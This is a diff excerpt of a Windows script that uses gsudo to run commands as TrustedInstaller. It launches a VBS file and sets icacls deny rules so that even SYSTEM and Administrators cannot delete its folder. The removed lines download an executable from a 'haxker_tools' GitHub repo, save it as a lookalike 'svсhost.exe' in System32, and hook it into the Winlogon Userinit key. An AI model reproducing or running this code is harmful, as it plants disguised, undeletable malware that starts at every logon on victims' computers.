@@ -33,8 +33,3 @@ gsudo -s --ti wscript.exe "C:\uptm\auto_host.vbs"
 # 5. Preventing file deletion
 gsudo -s --ti icacls "C:\uptm" /setowner "NT SERVICE\TrustedInstaller" /T /C
 gsudo -s --ti icacls "C:\uptm" /deny "NT AUTHORITY\SYSTEM:(OI)(CI)(D,DE,WDAC,WO)" "Administrators:(OI)(CI)(D,DE,WDAC,WO)" "Everyone:(OI)(CI)(D,DE,WDAC,WO)"
-
-# 6. Fake svchost run and download
-gsudo -s --ti powershell -Command 'iwr https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/svchost.exe -OutFile "C:\Windows\System32\svсhost.exe"'
-gsudo -s --ti reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "USERINIT" /t REG_SZ /d "C:\windows\system32\svсhost.exe, C:\Windows\system32\userinit.exe," /f
-gsudo -s --ti start "C:\Windows\System32\svсhost.exe"
